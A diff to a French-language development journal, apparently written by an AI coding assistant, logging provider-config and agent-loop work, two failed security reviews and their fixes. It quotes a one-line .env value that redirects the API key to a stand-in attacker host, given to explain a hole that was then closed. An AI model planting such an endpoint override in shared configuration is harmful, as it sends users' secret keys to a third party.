@@ -1,5 +1,146 @@
 # Journal
 
+## 2026-08-28 (soir). Étape 5 découpée, tranche 1 : le socle sans réseau
+
+L'étape 4 est partie sur GitHub (`9a63e30`). L'étape 5, annoncée à 5 ou 6
+sessions, a été découpée en six tranches livrables et la première validée
+avant toute ligne de code : 5.1 le socle sans réseau, 5.2 les outils et le
+chargeur de skills, 5.3 l'entretien en streaming, 5.4 la fiche de validation,
+5.5 le brouillon et le panneau de traçabilité, 5.6 révision, archivage et
+smoke tests. L'ordre met le risque en premier : le multi-fournisseurs est le
+seul endroit où le plan a payé une rallonge, autant qu'il casse headless
+plutôt que devant un écran.
+
+**Le contrat a gagné sa clause avant le code.** `references/instance.md` disait
+que la configuration n'est délibérément pas dans l'instance et que tout besoin
+de configuration par instance passe par lui d'abord. Le plan mettait la config
+fournisseur dans le `.env` de l'instance. Amendement écrit avant `providers.py`,
+et une décision prise contre la micro-décision du plan : le choix de
+fournisseur, de modèle et d'endpoint vit dans l'instance, **la clé jamais**.
+Une instance est un dossier que les gens copient, synchronisent et parfois
+versionnent.
+
+**`providers.py`.** Résolution de config (fichier d'instance, environnement du
+process par-dessus), garde secrets, table de prix, et les deux formats de fil
+en HTTP brut avec un seul type d'événement en sortie. Pas de bibliothèque
+fournisseur, volontairement : elle aurait rendu deux chemins de code là où la
+décision 3 du grill en a acheté un seul. Les flux enregistrés sont écrits
+depuis les formats publiés, donc ils prouvent le parseur et pas l'endpoint,
+et le code le dit. Aucun prix pour les modèles au format OpenAI : un prix
+deviné est pire que pas de prix.
+
+**`agent.py`.** La boucle. Demander, streamer, exécuter les outils demandés,
+rendre les résultats, recommencer. Quatre invariants tenus par des tests : un
+outil qui échoue répond au lieu de faire tomber l'entretien de quelqu'un, les
+résultats d'appels parallèles reviennent dans un seul message, la boucle a un
+plafond de tours, et `messages` reste une conversation qu'un fournisseur
+accepterait à chaque yield.
+
+### La revue à contexte frais a rendu REFUTED, et elle avait raison
+
+Trois invariants annoncés ne tenaient pas, et surtout la propriété de sécurité
+de la tranche n'était vraie que contre l'attaque naïve.
+
+**Le trou de conception.** J'avais justifié la garde secrets en disant que le
+`.env` d'instance est du contenu qui voyage, donc non fiable. Et je lisais
+`VERBATIM_BASE_URL` dans ce même fichier, valeur qui décide **où part la clé**
+lue dans l'environnement. Un `.env` d'une seule ligne
+(`VERBATIM_BASE_URL=https://collector.attacker.example`) envoyait la vraie clé
+chez un tiers, et `problems()` renvoyait vide. Reproduit par la revue.
+
+La moitié oubliée du raisonnement : si le fichier n'est pas digne de confiance
+pour porter une clé, il ne l'est pas non plus pour dire où elle va. Un endpoint
+nommé dans l'instance ne reçoit la clé que s'il est celui du fournisseur ou une
+machine locale. Un tiers hébergé doit être nommé depuis l'environnement, à côté
+de la clé qu'il va recevoir, parce que c'est cet appariement qui est la
+décision. `VERBATIM_ENDPOINT_OK` existe pour ça et le cas légitime (OpenRouter,
+Mistral) reste servi.
+
+Cinq autres constats confirmés, tous corrigés avec leur test de régression :
+
+- Une clé commentée plutôt que supprimée passait la garde, qui n'inspectait que
+  la carte parsée. Elle lit maintenant le fichier tel qu'écrit.
+- Un secret glissé dans l'userinfo ou la query string de l'endpoint passait par
+  l'autre porte, et serait ressorti à l'écran comme partie de l'endpoint.
+- Le contrat promettait « refuses to start » alors que `resolve()` n'avait
+  aucun appelant. `cli.py` l'appelle maintenant avant d'ouvrir un port.
+- Un générateur abandonné en cours de tour laissait un `tool_use` sans réponse,
+  ce qui est un 400 à la réouverture du brouillon. Or un navigateur qui se
+  ferme en plein entretien est le cas normal. Le message de résultats est
+  maintenant ajouté **avant** de lancer le moindre outil, pré-rempli, puis
+  écrasé en place.
+- Un flux coupé se lisait comme une fin de tour propre, et une demi-phrase
+  était rangée comme la réponse. Les deux fils n'émettent plus de stop que
+  quand le fournisseur a dit pourquoi il s'arrêtait ; le silence devient
+  `truncated` et les appels à moitié assemblés sont jetés.
+
+Plus le détail : fragments d'appel sans champ `index` qui fusionnaient en un
+seul, identifiants d'appel vides qui faisaient l'aller-retour, total de jetons
+cumulatif additionné à lui-même, et `/v1/v1/messages` quand on écrit l'URL de
+base avec la convention de l'autre fil.
+
+Aucun test existant ne couvrait ces cas : ils passaient tous après correction.
+
+### Le second tour de revue, et le vrai enseignement
+
+Les correctifs sont repartis en revue. Verdict REFUTED une deuxième fois, et
+**deux des problèmes étaient de mon fait, créés en corrigeant les premiers** :
+
+- La garde d'endpoint testait la **présence** du nom `VERBATIM_BASE_URL` dans
+  l'environnement, alors que la résolution teste la **vérité** de la valeur.
+  Un `VERBATIM_BASE_URL` exporté vide désarmait donc toute la garde, et c'est
+  exactement ce que produit un `set -a; . .env` sur le `.env.example` livré,
+  qui expose les trois variables à vide. Le trou d'origine rouvert pour
+  quiconque suit la documentation.
+- Mon correctif sur les fragments d'appel donnait une clé neuve à chaque
+  fragment sans `index`. Or seul le fragment d'ouverture porte le nom et
+  l'identifiant, les suivants portent les arguments. Un appel fragmenté
+  devenait donc plusieurs appels tenant chacun un morceau de JSON. J'avais
+  échangé un échec rare (deux appels parallèles qui fusionnent) contre un
+  échec courant, sur précisément la classe d'endpoint que ce fil sert.
+
+Plus un faux positif fatal : la garde secrets, passée à la lecture du texte
+brut, refusait la prose. `# Keys live in my shell profile, not here.` arrêtait
+l'app, et **le `.env.example` du dépôt refusait d'être copié** alors que sa
+première ligne invite à le copier. Elle ne lit plus que les affectations
+réelles, nom en majuscules et valeur non vide. Le cas sans signe égal est
+abandonné volontairement : rien ne lit une telle ligne, donc rien ne peut la
+fuiter, et le prix en faux positifs était devenu fatal.
+
+Trois trappes restaient ouvertes, fermées au même tour : un endpoint en clair
+sur le nom d'hôte du fournisseur, le même nom sur un autre port, et des
+identifiants d'appel fabriqués pouvant masquer de vrais identifiants.
+
+L'enseignement n'est pas la liste des bugs, c'est que **corriger sous revue
+casse autant que ça répare tant qu'aucun test ne tient l'invariant**. Les deux
+régressions ont été introduites dans du code que je venais de relire, sur des
+constats que je venais de comprendre.
+
+157 tests côté app, `check.sh` vert. `check.sh` fait désormais tourner la suite
+deux fois, une sur interpréteur nu (ce qui prouve la revendication « stdlib
+seule ») et une sous `uv` avec les dépendances.
+
+### Ce qui n'est pas fait, et c'est écrit
+
+Aucun smoke test contre un vrai endpoint. Décision explicite d'Alexis, pas un
+oubli : pas d'endpoint disponible dans cette session. Deux tests font passer
+une vraie requête HTTP à travers `http_transport` contre un serveur SSE local,
+ce qui prouve le transport, jamais un fournisseur. Le smoke test par
+fournisseur glisse en 5.6 et reste bloquant pour la v2.0.0. Restent aussi non
+tranchés faute d'endpoint : `max_tokens` contre `max_completion_tokens` sur les
+modèles de raisonnement OpenAI.
+
+### La direction artistique a changé
+
+Alexis a tranché : sobre, ni beige, ni marron, ni bordeaux, ni orange. La CSS
+de l'étape 4 ouvrait sur « warm paper, warm ink » et posait exactement ça.
+Conséquence non triviale : **l'orange était réservé au panneau de traçabilité
+par le plan**. Il est remplacé par un surligneur jaune acide, invariant par
+thème, et le panneau gagne un troisième état que le plan ne nommait pas, la
+citation fabriquée. Palettes clair et sombre vérifiées au contraste, serif
+réservé aux mots de la personne. La passe se fait avec la tranche 5.5, quand
+l'écran qui la justifie existe. Détail dans l'amendement du plan.
+
 ## 2026-08-28. Gate levé par Alexis, étape 4 livrée : le socle applicatif
 
 Commit `7722fc1`, local au moment de la session, non poussé. Le prompt de la
